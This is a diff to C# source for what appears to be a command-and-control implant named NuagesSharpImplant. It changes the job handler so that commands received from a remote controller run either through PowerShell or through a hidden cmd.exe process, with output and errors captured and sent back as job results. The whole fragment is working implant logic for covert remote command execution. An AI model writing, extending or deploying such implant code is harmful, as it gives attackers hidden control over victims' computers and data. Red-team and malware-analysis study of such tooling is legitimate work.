@@ -152,27 +152,37 @@ namespace NuagesSharpImplant
             string jobId = job["_id"];
             string cmd = job["payload"]["options"]["cmd"];
             string path = ".";
+            string result;
+            bool hasError;
             try
             {
                 path = job["payload"]["options"]["path"];
             }
             catch { }
             Directory.SetCurrentDirectory(path);
-            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
-            pProcess.StartInfo.FileName = "cmd.exe";
-            pProcess.StartInfo.Arguments = " /C " + cmd;
-            pProcess.StartInfo.UseShellExecute = false;
-            pProcess.StartInfo.RedirectStandardOutput = true;
-            pProcess.StartInfo.RedirectStandardError = true;
-            pProcess.StartInfo.CreateNoWindow = true;
-            pProcess.Start();
-            string strOutput = pProcess.StandardOutput.ReadToEnd();
-            string strError = pProcess.StandardError.ReadToEnd();
-            pProcess.WaitForExit();
-            bool hasError = (pProcess.ExitCode != 0);
-            string result = strOutput + strError;
-            SubmitJobResult(jobId, result, hasError);
+            if (this.config["shell"].ToLower() == "powershell")
+            {
+                result = Utils.Posh.posh(cmd);
+                hasError = false;
+            }
+            else
+            {
+                System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
+                pProcess.StartInfo.FileName = "cmd.exe";
+                pProcess.StartInfo.Arguments = " /C " + cmd;
+                pProcess.StartInfo.UseShellExecute = false;
+                pProcess.StartInfo.RedirectStandardOutput = true;
+                pProcess.StartInfo.RedirectStandardError = true;
+                pProcess.StartInfo.CreateNoWindow = true;
+                pProcess.Start();
+                string strOutput = pProcess.StandardOutput.ReadToEnd();
+                string strError = pProcess.StandardError.ReadToEnd();
+                pProcess.WaitForExit();
+                hasError = (pProcess.ExitCode != 0);
+                result = strOutput + strError;
+            }
 
+            SubmitJobResult(jobId, result, hasError);
         }
 
         void do_cd(JsonObject job)
